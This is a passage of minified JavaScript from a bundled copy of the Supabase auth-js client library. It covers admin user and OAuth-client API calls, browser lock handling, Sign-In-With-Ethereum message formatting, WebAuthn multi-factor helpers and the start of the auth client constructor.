Dv=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;function Ts(e){if(!Dv.test(e))throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not")}function lo(){const e={};return new Proxy(e,{get:(t,r)=>{if(r==="__isUserNotAvailableProxy")return!0;if(typeof r=="symbol"){const s=r.toString();if(s==="Symbol(Symbol.toPrimitive)"||s==="Symbol(Symbol.toStringTag)"||s==="Symbol(util.inspect.custom)")return}throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "${r}" property of the session object is not supported. Please use getUser() instead.`)},set:(t,r)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "${r}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)},deleteProperty:(t,r)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "${r}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)}})}function Mv(e,t){return new Proxy(e,{get:(r,s,a)=>{if(s==="__isInsecureUserWarningProxy")return!0;if(typeof s=="symbol"){const i=s.toString();if(i==="Symbol(Symbol.toPrimitive)"||i==="Symbol(Symbol.toStringTag)"||i==="Symbol(util.inspect.custom)"||i==="Symbol(nodejs.util.inspect.custom)")return Reflect.get(r,s,a)}return!t.value&&typeof s=="string"&&(console.warn("Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."),t.value=!0),Reflect.get(r,s,a)}})}function dh(e){return JSON.parse(JSON.stringify(e))}const os=e=>e.msg||e.message||e.error_description||e.error||JSON.stringify(e),Fv=[502,503,504];async function hh(e){var t;if(!Cv(e))throw new yc(os(e),0);if(Fv.includes(e.status))throw new yc(os(e),e.status);let r;try{r=await e.json()}catch(i){throw new us(os(i),i)}let s;const a=zv(e);if(a&&a.getTime()>=sp["2024-01-01"].timestamp&&typeof r=="object"&&r&&typeof r.code=="string"?s=r.code:typeof r=="object"&&r&&typeof r.error_code=="string"&&(s=r.error_code),s){if(s==="weak_password")throw new lh(os(r),e.status,((t=r.weak_password)===null||t===void 0?void 0:t.reasons)||[]);if(s==="session_not_found")throw new ot}else if(typeof r=="object"&&r&&typeof r.weak_password=="object"&&r.weak_password&&Array.isArray(r.weak_password.reasons)&&r.weak_password.reasons.length&&r.weak_password.reasons.reduce((i,l)=>i&&typeof l=="string",!0))throw new lh(os(r),e.status,r.weak_password.reasons);throw new pv(os(r),e.status||500,s)}const Bv=(e,t,r,s)=>{const a={method:e,headers:(t==null?void 0:t.headers)||{}};return e==="GET"?a:(a.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},t==null?void 0:t.headers),a.body=JSON.stringify(s),Object.assign(Object.assign({},a),r))};async function V(e,t,r,s){var a;const i=Object.assign({},s==null?void 0:s.headers);i[gc]||(i[gc]=sp["2024-01-01"].name),s!=null&&s.jwt&&(i.Authorization=`Bearer ${s.jwt}`);const l=(a=s==null?void 0:s.query)!==null&&a!==void 0?a:{};s!=null&&s.redirectTo&&(l.redirect_to=s.redirectTo);const o=Object.keys(l).length?"?"+new URLSearchParams(l).toString():"",c=await Wv(e,t,r+o,{headers:i,noResolveJson:s==null?void 0:s.noResolveJson},{},s==null?void 0:s.body);return s!=null&&s.xform?s==null?void 0:s.xform(c):{data:Object.assign({},c),error:null}}async function Wv(e,t,r,s,a,i){const l=Bv(t,s,a,i);let o;try{o=await e(r,Object.assign({},l))}catch(c){throw console.error(c),new yc(os(c),0)}if(o.ok||await hh(o),s!=null&&s.noResolveJson)return o;try{return await o.json()}catch(c){await hh(c)}}function Pt(e){var t;let r=null;Hv(e)&&(r=Object.assign({},e),e.expires_at||(r.expires_at=Nv(e.expires_in)));const s=(t=e.user)!==null&&t!==void 0?t:e;return{data:{session:r,user:s},error:null}}function fh(e){const t=Pt(e);return!t.error&&e.weak_password&&typeof e.weak_password=="object"&&Array.isArray(e.weak_password.reasons)&&e.weak_password.reasons.length&&e.weak_password.message&&typeof e.weak_password.message=="string"&&e.weak_password.reasons.reduce((r,s)=>r&&typeof s=="string",!0)&&(t.data.weak_password=e.weak_password),t}function kr(e){var t;return{data:{user:(t=e.user)!==null&&t!==void 0?t:e},error:null}}function Vv(e){return{data:e,error:null}}function qv(e){const{action_link:t,email_otp:r,hashed_token:s,redirect_to:a,verification_type:i}=e,l=cl(e,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),o={action_link:t,email_otp:r,hashed_token:s,redirect_to:a,verification_type:i},c=Object.assign({},l);return{data:{properties:o,user:c},error:null}}function mh(e){return e}function Hv(e){return e.access_token&&e.refresh_token&&e.expires_in}const oo=["global","local","others"];class Kv{constructor({url:t="",headers:r={},fetch:s}){this.url=t,this.headers=r,this.fetch=ip(s),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)},this.oauth={listClients:this._listOAuthClients.bind(this),createClient:this._createOAuthClient.bind(this),getClient:this._getOAuthClient.bind(this),updateClient:this._updateOAuthClient.bind(this),deleteClient:this._deleteOAuthClient.bind(this),regenerateClientSecret:this._regenerateOAuthClientSecret.bind(this)}}async signOut(t,r=oo[0]){if(oo.indexOf(r)<0)throw new Error(`@supabase/auth-js: Parameter scope must be one of ${oo.join(", ")}`);try{return await V(this.fetch,"POST",`${this.url}/logout?scope=${r}`,{headers:this.headers,jwt:t,noResolveJson:!0}),{data:null,error:null}}catch(s){if(M(s))return{data:null,error:s};throw s}}async inviteUserByEmail(t,r={}){try{return await V(this.fetch,"POST",`${this.url}/invite`,{body:{email:t,data:r.data},headers:this.headers,redirectTo:r.redirectTo,xform:kr})}catch(s){if(M(s))return{data:{user:null},error:s};throw s}}async generateLink(t){try{const{options:r}=t,s=cl(t,["options"]),a=Object.assign(Object.assign({},s),r);return"newEmail"in s&&(a.new_email=s==null?void 0:s.newEmail,delete a.newEmail),await V(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:a,headers:this.headers,xform:qv,redirectTo:r==null?void 0:r.redirectTo})}catch(r){if(M(r))return{data:{properties:null,user:null},error:r};throw r}}async createUser(t){try{return await V(this.fetch,"POST",`${this.url}/admin/users`,{body:t,headers:this.headers,xform:kr})}catch(r){if(M(r))return{data:{user:null},error:r};throw r}}async listUsers(t){var r,s,a,i,l,o,c;try{const u={nextPage:null,lastPage:0,total:0},h=await V(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(s=(r=t==null?void 0:t.page)===null||r===void 0?void 0:r.toString())!==null&&s!==void 0?s:"",per_page:(i=(a=t==null?void 0:t.perPage)===null||a===void 0?void 0:a.toString())!==null&&i!==void 0?i:""},xform:mh});if(h.error)throw h.error;const p=await h.json(),x=(l=h.headers.get("x-total-count"))!==null&&l!==void 0?l:0,v=(c=(o=h.headers.get("link"))===null||o===void 0?void 0:o.split(","))!==null&&c!==void 0?c:[];return v.length>0&&(v.forEach(f=>{const w=parseInt(f.split(";")[0].split("=")[1].substring(0,1)),j=JSON.parse(f.split(";")[1].split("=")[1]);u[`${j}Page`]=w}),u.total=parseInt(x)),{data:Object.assign(Object.assign({},p),u),error:null}}catch(u){if(M(u))return{data:{users:[]},error:u};throw u}}async getUserById(t){Ts(t);try{return await V(this.fetch,"GET",`${this.url}/admin/users/${t}`,{headers:this.headers,xform:kr})}catch(r){if(M(r))return{data:{user:null},error:r};throw r}}async updateUserById(t,r){Ts(t);try{return await V(this.fetch,"PUT",`${this.url}/admin/users/${t}`,{body:r,headers:this.headers,xform:kr})}catch(s){if(M(s))return{data:{user:null},error:s};throw s}}async deleteUser(t,r=!1){Ts(t);try{return await V(this.fetch,"DELETE",`${this.url}/admin/users/${t}`,{headers:this.headers,body:{should_soft_delete:r},xform:kr})}catch(s){if(M(s))return{data:{user:null},error:s};throw s}}async _listFactors(t){Ts(t.userId);try{const{data:r,error:s}=await V(this.fetch,"GET",`${this.url}/admin/users/${t.userId}/factors`,{headers:this.headers,xform:a=>({data:{factors:a},error:null})});return{data:r,error:s}}catch(r){if(M(r))return{data:null,error:r};throw r}}async _deleteFactor(t){Ts(t.userId),Ts(t.id);try{return{data:await V(this.fetch,"DELETE",`${this.url}/admin/users/${t.userId}/factors/${t.id}`,{headers:this.headers}),error:null}}catch(r){if(M(r))return{data:null,error:r};throw r}}async _listOAuthClients(t){var r,s,a,i,l,o,c;try{const u={nextPage:null,lastPage:0,total:0},h=await V(this.fetch,"GET",`${this.url}/admin/oauth/clients`,{headers:this.headers,noResolveJson:!0,query:{page:(s=(r=t==null?void 0:t.page)===null||r===void 0?void 0:r.toString())!==null&&s!==void 0?s:"",per_page:(i=(a=t==null?void 0:t.perPage)===null||a===void 0?void 0:a.toString())!==null&&i!==void 0?i:""},xform:mh});if(h.error)throw h.error;const p=await h.json(),x=(l=h.headers.get("x-total-count"))!==null&&l!==void 0?l:0,v=(c=(o=h.headers.get("link"))===null||o===void 0?void 0:o.split(","))!==null&&c!==void 0?c:[];return v.length>0&&(v.forEach(f=>{const w=parseInt(f.split(";")[0].split("=")[1].substring(0,1)),j=JSON.parse(f.split(";")[1].split("=")[1]);u[`${j}Page`]=w}),u.total=parseInt(x)),{data:Object.assign(Object.assign({},p),u),error:null}}catch(u){if(M(u))return{data:{clients:[]},error:u};throw u}}async _createOAuthClient(t){try{return await V(this.fetch,"POST",`${this.url}/admin/oauth/clients`,{body:t,headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(M(r))return{data:null,error:r};throw r}}async _getOAuthClient(t){try{return await V(this.fetch,"GET",`${this.url}/admin/oauth/clients/${t}`,{headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(M(r))return{data:null,error:r};throw r}}async _updateOAuthClient(t,r){try{return await V(this.fetch,"PUT",`${this.url}/admin/oauth/clients/${t}`,{body:r,headers:this.headers,xform:s=>({data:s,error:null})})}catch(s){if(M(s))return{data:null,error:s};throw s}}async _deleteOAuthClient(t){try{return await V(this.fetch,"DELETE",`${this.url}/admin/oauth/clients/${t}`,{headers:this.headers,noResolveJson:!0}),{data:null,error:null}}catch(r){if(M(r))return{data:null,error:r};throw r}}async _regenerateOAuthClientSecret(t){try{return await V(this.fetch,"POST",`${this.url}/admin/oauth/clients/${t}/regenerate_secret`,{headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(M(r))return{data:null,error:r};throw r}}}function ph(e={}){return{getItem:t=>e[t]||null,setItem:(t,r)=>{e[t]=r},removeItem:t=>{delete e[t]}}}const Rs={debug:!!(globalThis&&ap()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class lp extends Error{constructor(t){super(t),this.isAcquireTimeout=!0}}class Gv extends lp{}async function Jv(e,t,r){Rs.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",e,t);const s=new globalThis.AbortController;return t>0&&setTimeout(()=>{s.abort(),Rs.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",e)},t),await Promise.resolve().then(()=>globalThis.navigator.locks.request(e,t===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:s.signal},async a=>{if(a){Rs.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",e,a.name);try{return await r()}finally{Rs.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",e,a.name)}}else{if(t===0)throw Rs.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",e),new Gv(`Acquiring an exclusive Navigator LockManager lock "${e}" immediately failed`);if(Rs.debug)try{const i=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(i,null,"  "))}catch(i){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",i)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await r()}}))}function Yv(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}function op(e){if(!/^0x[a-fA-F0-9]{40}$/.test(e))throw new Error(`@supabase/auth-js: Address "${e}" is invalid.`);return e.toLowerCase()}function Qv(e){return parseInt(e,16)}function Xv(e){const t=new TextEncoder().encode(e);return"0x"+Array.from(t,s=>s.toString(16).padStart(2,"0")).join("")}function Zv(e){var t;const{chainId:r,domain:s,expirationTime:a,issuedAt:i=new Date,nonce:l,notBefore:o,requestId:c,resources:u,scheme:h,uri:p,version:x}=e;{if(!Number.isInteger(r))throw new Error(`@supabase/auth-js: Invalid SIWE message field "chainId". Chain ID must be a EIP-155 chain ID. Provided value: ${r}`);if(!s)throw new Error('@supabase/auth-js: Invalid SIWE message field "domain". Domain must be provided.');if(l&&l.length<8)throw new Error(`@supabase/auth-js: Invalid SIWE message field "nonce". Nonce must be at least 8 characters. Provided value: ${l}`);if(!p)throw new Error('@supabase/auth-js: Invalid SIWE message field "uri". URI must be provided.');if(x!=="1")throw new Error(`@supabase/auth-js: Invalid SIWE message field "version". Version must be '1'. Provided value: ${x}`);if(!((t=e.statement)===null||t===void 0)&&t.includes(`
`))throw new Error(`@supabase/auth-js: Invalid SIWE message field "statement". Statement must not include '\\n'. Provided value: ${e.statement}`)}const v=op(e.address),f=h?`${h}://${s}`:s,w=e.statement?`${e.statement}
`:"",j=`${f} wants you to sign in with your Ethereum account:
${v}

${w}`;let y=`URI: ${p}
Version: ${x}
Chain ID: ${r}${l?`
Nonce: ${l}`:""}
Issued At: ${i.toISOString()}`;if(a&&(y+=`
Expiration Time: ${a.toISOString()}`),o&&(y+=`
Not Before: ${o.toISOString()}`),c&&(y+=`
Request ID: ${c}`),u){let m=`
Resources:`;for(const g of u){if(!g||typeof g!="string")throw new Error(`@supabase/auth-js: Invalid SIWE message field "resources". Every resource must be a valid string. Provided value: ${g}`);m+=`
- ${g}`}y+=m}return`${j}
${y}`}class Ce extends Error{constructor({message:t,code:r,cause:s,name:a}){var i;super(t,{cause:s}),this.__isWebAuthnError=!0,this.name=(i=a??(s instanceof Error?s.name:void 0))!==null&&i!==void 0?i:"Unknown Error",this.code=r}}class Fi extends Ce{constructor(t,r){super({code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:r,message:t}),this.name="WebAuthnUnknownError",this.originalError=r}}function ew({error:e,options:t}){var r,s,a;const{publicKey:i}=t;if(!i)throw Error("options was missing required publicKey property");if(e.name==="AbortError"){if(t.signal instanceof AbortSignal)return new Ce({message:"Registration ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:e})}else if(e.name==="ConstraintError"){if(((r=i.authenticatorSelection)===null||r===void 0?void 0:r.requireResidentKey)===!0)return new Ce({message:"Discoverable credentials were required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_DISCOVERABLE_CREDENTIAL_SUPPORT",cause:e});if(t.mediation==="conditional"&&((s=i.authenticatorSelection)===null||s===void 0?void 0:s.userVerification)==="required")return new Ce({message:"User verification was required during automatic registration but it could not be performed",code:"ERROR_AUTO_REGISTER_USER_VERIFICATION_FAILURE",cause:e});if(((a=i.authenticatorSelection)===null||a===void 0?void 0:a.userVerification)==="required")return new Ce({message:"User verification was required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_USER_VERIFICATION_SUPPORT",cause:e})}else{if(e.name==="InvalidStateError")return new Ce({message:"The authenticator was previously registered",code:"ERROR_AUTHENTICATOR_PREVIOUSLY_REGISTERED",cause:e});if(e.name==="NotAllowedError")return new Ce({message:e.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:e});if(e.name==="NotSupportedError")return i.pubKeyCredParams.filter(o=>o.type==="public-key").length===0?new Ce({message:'No entry in pubKeyCredParams was of type "public-key"',code:"ERROR_MALFORMED_PUBKEYCREDPARAMS",cause:e}):new Ce({message:"No available authenticator supported any of the specified pubKeyCredParams algorithms",code:"ERROR_AUTHENTICATOR_NO_SUPPORTED_PUBKEYCREDPARAMS_ALG",cause:e});if(e.name==="SecurityError"){const l=window.location.hostname;if(cp(l)){if(i.rp.id!==l)return new Ce({message:`The RP ID "${i.rp.id}" is invalid for this domain`,code:"ERROR_INVALID_RP_ID",cause:e})}else return new Ce({message:`${window.location.hostname} is an invalid domain`,code:"ERROR_INVALID_DOMAIN",cause:e})}else if(e.name==="TypeError"){if(i.user.id.byteLength<1||i.user.id.byteLength>64)return new Ce({message:"User ID was not between 1 and 64 characters",code:"ERROR_INVALID_USER_ID_LENGTH",cause:e})}else if(e.name==="UnknownError")return new Ce({message:"The authenticator was unable to process the specified options, or could not create a new credential",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:e})}return new Ce({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:e})}function tw({error:e,options:t}){const{publicKey:r}=t;if(!r)throw Error("options was missing required publicKey property");if(e.name==="AbortError"){if(t.signal instanceof AbortSignal)return new Ce({message:"Authentication ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:e})}else{if(e.name==="NotAllowedError")return new Ce({message:e.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:e});if(e.name==="SecurityError"){const s=window.location.hostname;if(cp(s)){if(r.rpId!==s)return new Ce({message:`The RP ID "${r.rpId}" is invalid for this domain`,code:"ERROR_INVALID_RP_ID",cause:e})}else return new Ce({message:`${window.location.hostname} is an invalid domain`,code:"ERROR_INVALID_DOMAIN",cause:e})}else if(e.name==="UnknownError")return new Ce({message:"The authenticator was unable to process the specified options, or could not create a new assertion signature",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:e})}return new Ce({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:e})}class rw{createNewAbortSignal(){if(this.controller){const r=new Error("Cancelling existing WebAuthn API call for new one");r.name="AbortError",this.controller.abort(r)}const t=new AbortController;return this.controller=t,t.signal}cancelCeremony(){if(this.controller){const t=new Error("Manually cancelling existing WebAuthn API call");t.name="AbortError",this.controller.abort(t),this.controller=void 0}}}const sw=new rw;function nw(e){if(!e)throw new Error("Credential creation options are required");if(typeof PublicKeyCredential<"u"&&"parseCreationOptionsFromJSON"in PublicKeyCredential&&typeof PublicKeyCredential.parseCreationOptionsFromJSON=="function")return PublicKeyCredential.parseCreationOptionsFromJSON(e);const{challenge:t,user:r,excludeCredentials:s}=e,a=cl(e,["challenge","user","excludeCredentials"]),i=en(t).buffer,l=Object.assign(Object.assign({},r),{id:en(r.id).buffer}),o=Object.assign(Object.assign({},a),{challenge:i,user:l});if(s&&s.length>0){o.excludeCredentials=new Array(s.length);for(let c=0;c<s.length;c++){const u=s[c];o.excludeCredentials[c]=Object.assign(Object.assign({},u),{id:en(u.id).buffer,type:u.type||"public-key",transports:u.transports})}}return o}function aw(e){if(!e)throw new Error("Credential request options are required");if(typeof PublicKeyCredential<"u"&&"parseRequestOptionsFromJSON"in PublicKeyCredential&&typeof PublicKeyCredential.parseRequestOptionsFromJSON=="function")return PublicKeyCredential.parseRequestOptionsFromJSON(e);const{challenge:t,allowCredentials:r}=e,s=cl(e,["challenge","allowCredentials"]),a=en(t).buffer,i=Object.assign(Object.assign({},s),{challenge:a});if(r&&r.length>0){i.allowCredentials=new Array(r.length);for(let l=0;l<r.length;l++){const o=r[l];i.allowCredentials[l]=Object.assign(Object.assign({},o),{id:en(o.id).buffer,type:o.type||"public-key",transports:o.transports})}}return i}function iw(e){var t;if("toJSON"in e&&typeof e.toJSON=="function")return e.toJSON();const r=e;return{id:e.id,rawId:e.id,response:{attestationObject:ms(new Uint8Array(e.response.attestationObject)),clientDataJSON:ms(new Uint8Array(e.response.clientDataJSON))},type:"public-key",clientExtensionResults:e.getClientExtensionResults(),authenticatorAttachment:(t=r.authenticatorAttachment)!==null&&t!==void 0?t:void 0}}function lw(e){var t;if("toJSON"in e&&typeof e.toJSON=="function")return e.toJSON();const r=e,s=e.getClientExtensionResults(),a=e.response;return{id:e.id,rawId:e.id,response:{authenticatorData:ms(new Uint8Array(a.authenticatorData)),clientDataJSON:ms(new Uint8Array(a.clientDataJSON)),signature:ms(new Uint8Array(a.signature)),userHandle:a.userHandle?ms(new Uint8Array(a.userHandle)):void 0},type:"public-key",clientExtensionResults:s,authenticatorAttachment:(t=r.authenticatorAttachment)!==null&&t!==void 0?t:void 0}}function cp(e){return e==="localhost"||/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i.test(e)}function xh(){var e,t;return!!(De()&&"PublicKeyCredential"in window&&window.PublicKeyCredential&&"credentials"in navigator&&typeof((e=navigator==null?void 0:navigator.credentials)===null||e===void 0?void 0:e.create)=="function"&&typeof((t=navigator==null?void 0:navigator.credentials)===null||t===void 0?void 0:t.get)=="function")}async function ow(e){try{const t=await navigator.credentials.create(e);return t?t instanceof PublicKeyCredential?{data:t,error:null}:{data:null,error:new Fi("Browser returned unexpected credential type",t)}:{data:null,error:new Fi("Empty credential response",t)}}catch(t){return{data:null,error:ew({error:t,options:e})}}}async function cw(e){try{const t=await navigator.credentials.get(e);return t?t instanceof PublicKeyCredential?{data:t,error:null}:{data:null,error:new Fi("Browser returned unexpected credential type",t)}:{data:null,error:new Fi("Empty credential response",t)}}catch(t){return{data:null,error:tw({error:t,options:e})}}}const uw={hints:["security-key"],authenticatorSelection:{authenticatorAttachment:"cross-platform",requireResidentKey:!1,userVerification:"preferred",residentKey:"discouraged"},attestation:"direct"},dw={userVerification:"preferred",hints:["security-key"],attestation:"direct"};function Bi(...e){const t=a=>a!==null&&typeof a=="object"&&!Array.isArray(a),r=a=>a instanceof ArrayBuffer||ArrayBuffer.isView(a),s={};for(const a of e)if(a)for(const i in a){const l=a[i];if(l!==void 0)if(Array.isArray(l))s[i]=l;else if(r(l))s[i]=l;else if(t(l)){const o=s[i];t(o)?s[i]=Bi(o,l):s[i]=Bi(l)}else s[i]=l}return s}function hw(e,t){return Bi(uw,e,t||{})}function fw(e,t){return Bi(dw,e,t||{})}class mw{constructor(t){this.client=t,this.enroll=this._enroll.bind(this),this.challenge=this._challenge.bind(this),this.verify=this._verify.bind(this),this.authenticate=this._authenticate.bind(this),this.register=this._register.bind(this)}async _enroll(t){return this.client.mfa.enroll(Object.assign(Object.assign({},t),{factorType:"webauthn"}))}async _challenge({factorId:t,webauthn:r,friendlyName:s,signal:a},i){try{const{data:l,error:o}=await this.client.mfa.challenge({factorId:t,webauthn:r});if(!l)return{data:null,error:o};const c=a??sw.createNewAbortSignal();if(l.webauthn.type==="create"){const{user:u}=l.webauthn.credential_options.publicKey;u.name||(u.name=`${u.id}:${s}`),u.displayName||(u.displayName=u.name)}switch(l.webauthn.type){case"create":{const u=hw(l.webauthn.credential_options.publicKey,i==null?void 0:i.create),{data:h,error:p}=await ow({publicKey:u,signal:c});return h?{data:{factorId:t,challengeId:l.id,webauthn:{type:l.webauthn.type,credential_response:h}},error:null}:{data:null,error:p}}case"request":{const u=fw(l.webauthn.credential_options.publicKey,i==null?void 0:i.request),{data:h,error:p}=await cw(Object.assign(Object.assign({},l.webauthn.credential_options),{publicKey:u,signal:c}));return h?{data:{factorId:t,challengeId:l.id,webauthn:{type:l.webauthn.type,credential_response:h}},error:null}:{data:null,error:p}}}}catch(l){return M(l)?{data:null,error:l}:{data:null,error:new us("Unexpected error in challenge",l)}}}async _verify({challengeId:t,factorId:r,webauthn:s}){return this.client.mfa.verify({factorId:r,challengeId:t,webauthn:s})}async _authenticate({factorId:t,webauthn:{rpId:r=typeof window<"u"?window.location.hostname:void 0,rpOrigins:s=typeof window<"u"?[window.location.origin]:void 0,signal:a}={}},i){if(!r)return{data:null,error:new va("rpId is required for WebAuthn authentication")};try{if(!xh())return{data:null,error:new us("Browser does not support WebAuthn",null)};const{data:l,error:o}=await this.challenge({factorId:t,webauthn:{rpId:r,rpOrigins:s},signal:a},{request:i});if(!l)return{data:null,error:o};const{webauthn:c}=l;return this._verify({factorId:t,challengeId:l.challengeId,webauthn:{type:c.type,rpId:r,rpOrigins:s,credential_response:c.credential_response}})}catch(l){return M(l)?{data:null,error:l}:{data:null,error:new us("Unexpected error in authenticate",l)}}}async _register({friendlyName:t,webauthn:{rpId:r=typeof window<"u"?window.location.hostname:void 0,rpOrigins:s=typeof window<"u"?[window.location.origin]:void 0,signal:a}={}},i){if(!r)return{data:null,error:new va("rpId is required for WebAuthn registration")};try{if(!xh())return{data:null,error:new us("Browser does not support WebAuthn",null)};const{data:l,error:o}=await this._enroll({friendlyName:t});if(!l)return await this.client.mfa.listFactors().then(h=>{var p;return(p=h.data)===null||p===void 0?void 0:p.all.find(x=>x.factor_type==="webauthn"&&x.friendly_name===t&&x.status!=="unverified")}).then(h=>h?this.client.mfa.unenroll({factorId:h==null?void 0:h.id}):void 0),{data:null,error:o};const{data:c,error:u}=await this._challenge({factorId:l.id,friendlyName:l.friendly_name,webauthn:{rpId:r,rpOrigins:s},signal:a},{create:i});return c?this._verify({factorId:l.id,challengeId:c.challengeId,webauthn:{rpId:r,rpOrigins:s,type:c.webauthn.type,credential_response:c.webauthn.credential_response}}):{data:null,error:u}}catch(l){return M(l)?{data:null,error:l}:{data:null,error:new us("Unexpected error in register",l)}}}}Yv();const pw={url:uv,storageKey:dv,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:hv,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1,throwOnError:!1,lockAcquireTimeout:1e4};async function gh(e,t,r){return await r()}const Ps={};class wa{get jwks(){var t,r;return(r=(t=Ps[this.storageKey])===null||t===void 0?void 0:t.jwks)!==null&&r!==void 0?r:{keys:[]}}set jwks(t){Ps[this.storageKey]=Object.assign(Object.assign({},Ps[this.storageKey]),{jwks:t})}get jwks_cached_at(){var t,r;return(r=(t=Ps[this.storageKey])===null||t===void 0?void 0:t.cachedAt)!==null&&r!==void 0?r:Number.MIN_SAFE_INTEGER}set jwks_cached_at(t){Ps[this.storageKey]=Object.assign(Object.assign({},Ps[this.storageKey]),{cachedAt:t})}constructor(t){var r,s,a;this.userStorage=null,this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.autoRefreshTickTimeout=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log;const i=Object.assign(Object.assign({},pw),t);if(this.storageKey=i.storageKey,this.instanceID=(r=wa.nextInstanceID[this.storageKey])!==null&&r!==void 0?r:0,wa.nextInstanceID[this.storageKey]=this.instanceID+1,this.logDebugMessages=!!i.debug,typeof i.debug=="function"&&(this.logger=i.debug),this.instanceID>0&&De()){const l=`${this._logPrefix()} Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.`;console.warn(l),this.logDebugMessages&&console.trace(l)}if(this.persistSession=i.persistSession,this.autoRefreshToken=i.autoRefreshToken,this.admin=new Kv({url:i.url,headers:i.headers,fetch:i.fetch}),this.url=i.url,this.headers=i.headers,this.fetch=ip(i.fetch),this.lock=i.lock||gh,this.detectSessionInUrl=i.detectSessionInUrl,this.flowType=i.flowType,this.hasCustomAuthorizationHeader=i.hasCustomAuthorizationHeader,this.throwOnError=i.throwOnError,this.lockAcquireTimeout=i.lockAcquireTimeout,i.lock?this.lock=i.lock:this.persistSession&&De()&&(!((s=globalThis==null?void 0:globalThis.navigator)===null||s===void 0)&&s.locks)?this.lock=Jv:this.lock=gh,this.jwks||(this.jwks={keys:[]},this.jwks_cached_at=Number.MIN_SAFE_INTEGER),this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this),webauthn:new mw(this)},this.oauth={getAuthorizationDetails:this._getAuthorizationDetails.bind(this),approveAuthorization:this._approveAuthorization.bind(this),denyAuthorization:this._denyAuthorization.bind(this),listGrants:this._listOAuthGrants.bind(this),revokeGrant:this._revokeOAuthGrant.bind(this)},this.persistSession?(i.storage?this.storage=i.storage:ap()?this.storage=globalThis.localStorage:(this.memoryStorage={},this.storage=ph(this.memoryStorage)),i.userStorage&&(this.userStorage=i.userStorage)):(this.memoryStorage={},this.storage=ph(this.memoryStorage)),De()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(l){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",l)}(a=this.broadcastChannel)===null||a===void 0||a.addEventListener("message",async l=>{this._debug("received broadcast notification from other tab or client",l),await this._notifyAllSubscribers(l.data.event,l.data.session,!1)})}this.initialize()}isThrowOnErrorEnabled(){return this.throwOnError}_returnResult(t){if(this.throwOnError&&t&&t.error)throw t.error;return t}_logPrefix(){return`GoTrueClient@${this.storageKey}:${this.instanceID} (${rp}) ${new Date().toISOString()}`}_debug(...t){return this.logDebugMessages&&this.logger(this._logPrefix(),...t),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(this.lockAcquireTimeout,async()=>await 